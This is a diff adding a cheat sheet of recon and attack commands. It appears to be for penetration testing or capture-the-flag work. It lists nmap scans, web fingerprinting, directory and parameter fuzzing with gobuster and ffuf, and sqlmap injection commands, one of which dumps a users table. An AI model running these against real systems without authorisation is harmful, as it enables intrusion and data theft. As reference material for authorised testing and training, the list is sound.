@@ -1,0 +1,57 @@
+# === RECON COMMANDS ===
+# Replace TARGET with IP or hostname (include http:// for web tools)
+
+
+# --- Nmap: quick scan (top 1000 ports) ---
+nmap -sV -sC -oN nmap_quick.txt TARGET
+
+# --- Nmap: full port scan (slower, catches unusual ports) ---
+nmap -sV -sC -p- --min-rate 5000 -oN nmap_full.txt TARGET
+
+# --- Nmap: UDP top 100 (slow, but finds SNMP/DNS/etc) ---
+nmap -sU --top-ports 100 -oN nmap_udp.txt TARGET
+
+# --- Nmap: vulnerability scripts ---
+nmap --script vuln -oN nmap_vuln.txt TARGET
+
+# --- WhatWeb: tech stack fingerprinting ---
+whatweb -a 3 -v http://TARGET
+
+# --- Nikto: web server misconfig scanner ---
+nikto -h http://TARGET -o nikto.txt
+
+# --- Gobuster: directory brute force ---
+gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js,bak -o gobuster_dirs.txt
+
+# --- Gobuster: file extensions on found dirs ---
+gobuster dir -u http://TARGET/DIR -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,old,conf -o gobuster_sub.txt
+
+# --- Gobuster: vhost enumeration ---
+gobuster vhost -u http://TARGET -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+
+# --- ffuf: directory fuzzing ---
+ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,201,301,302,401,403 -o ffuf_dirs.json
+
+# --- ffuf: parameter fuzzing (GET) ---
+ffuf -u "http://TARGET/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200
+
+# --- ffuf: parameter value fuzzing ---
+ffuf -u "http://TARGET/page?id=FUZZ" -w /usr/share/seclists/Fuzzing/integers.txt -mc 200
+
+# --- ffuf: POST body fuzzing ---
+ffuf -u http://TARGET/login -X POST -d "username=FUZZ&password=test" -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -mc 200,302
+
+# --- SQLMap: auto injection scan ---
+sqlmap -u "http://TARGET/page?id=1" --batch --level 3 --risk 2 --dbs
+
+# --- SQLMap: POST parameter ---
+sqlmap -u "http://TARGET/login" --data="user=admin&pass=test" --batch --dbs
+
+# --- SQLMap: with session cookie ---
+sqlmap -u "http://TARGET/page?id=1" --cookie="session=VALUE" --batch --dbs
+
+# --- SQLMap: dump specific table ---
+sqlmap -u "http://TARGET/page?id=1" --batch -D dbname -T users --dump
+
+# --- SQLMap: header injection ---
+sqlmap -u "http://TARGET/" -H "X-Forwarded-For: *" --batch --dbs
